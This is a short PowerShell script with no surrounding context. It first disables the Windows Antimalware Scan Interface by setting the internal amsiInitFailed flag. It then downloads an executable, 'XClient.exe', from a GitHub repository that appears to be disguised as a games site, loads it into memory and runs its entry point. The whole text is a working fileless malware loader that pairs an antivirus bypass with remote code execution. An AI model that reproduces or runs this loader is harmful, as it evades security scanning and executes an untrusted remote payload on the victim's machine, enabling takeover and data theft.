[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); 
$wc = New-Object System.Net.WebClient; 
$bytes = $wc.DownloadData('https://github.com/unblockedgames2/Fanta.Live/raw/refs/heads/main/XClient.exe'); 
$assembly = [System.Reflection.Assembly]::Load($bytes); 
$entryPoint = $assembly.EntryPoint; 
if ($entryPoint) { 
    if ($entryPoint.GetParameters().Length -eq 0) {
        $entryPoint.Invoke($null, @())
    } else {
        $entryPoint.Invoke($null, @([string[]]@()))
    }
}
